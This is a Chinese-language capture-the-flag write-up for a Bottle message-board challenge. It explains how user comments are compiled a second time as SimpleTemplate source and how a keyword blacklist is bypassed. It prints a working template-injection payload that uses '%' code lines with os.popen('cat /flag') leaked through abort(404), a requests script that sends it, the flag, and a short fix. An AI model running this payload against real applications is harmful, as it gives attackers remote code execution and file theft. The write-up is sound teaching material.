# 绳网委托Bottle版

## 题目简述

题目是一个 Bottle 留言板。用户提交的留言先被拼接进完整 HTML 字符串，随后整个字符串再次传给 `bottle.template()` 编译。过滤器删除了 `{}`、尖括号以及 `eval`、`system`、`exec` 等关键字，因此常见的 `{{ expression }}` 表达式注入不可用。

Bottle SimpleTemplate 除了双花括号表达式，还支持以 `%` 开头的 Python 代码行和 `% end` 块结束语法。过滤器没有处理百分号、换行、`if`、`__import__` 或 `abort`，所以可以用代码行语法导入模块、读取 `/flag`，再把内容放进 HTTP 404 响应。

## 解题过程

### 定位二次模板编译

留言内容经过 `check()` 后被保存：

```python
def check(message):
    return (
        message.replace("{", " ")
        .replace("}", " ")
        .replace("eval", "?")
        .replace("system", "~")
        .replace("exec", "?")
        .replace("7*7", "我猜你想输入7*7")
        .replace("<", "尖括号")
        .replace(">", "尖括号")
    )
```

`Comment(messages)` 使用 Python f-string 把留言原样放入页面，路由又把生成的页面作为模板源码处理：

```python
messages.append({"text": text, "time": now})
return template(Comment(messages))
```

因此用户输入不是普通显示数据，而会在第二次 `template()` 调用时参与 SimpleTemplate 语法解析。

### 使用 `% if` 代码行绕过过滤

SimpleTemplate 将一行开头的 `%` 视为 Python 语句，并用 `% end` 结束缩进块。构造如下留言：

```html
% if __import__('bottle').abort(404, __import__('os').popen('cat /flag').read()):
ignored
% end
```

执行顺序如下：

1. `__import__('os')` 导入 `os`，`popen('cat /flag').read()` 得到 flag。
2. `__import__('bottle').abort(404, flag)` 立即抛出 Bottle 的 HTTP 错误，并把 flag 作为响应正文。
3. `abort()` 不会正常返回，`if` 的真假并不重要；块结构只是让表达式进入可执行的模板代码行。

该载荷不含 `{}`、`eval`、`system`、`exec` 或尖括号，能够完整通过过滤。

### 发送请求

使用 `requests` 提交多行表单最不容易破坏换行：

```python
import requests

payload = """
% if __import__('bottle').abort(404, __import__('os').popen('cat /flag').read()):
ignored
% end
"""

response = requests.post(
    "http://target/comment",
    data={"message": payload},
)
print(response.status_code)
print(response.text)
```

响应状态为 `404`，正文中得到：

```text
0xGame{Bottle_is_an_Amazing_Framework!}
```

## 方法总结

本题的关键不是绕过双花括号，而是识别同一模板引擎提供的另一套语法。黑名单只覆盖常见 payload 形式，没有改变“用户输入被当作模板源码再次编译”的根本问题。修复时应只把固定模板交给 `template()`，用户内容必须作为数据变量传入并按上下文转义，不能依靠删除少量字符或关键字建立安全边界。
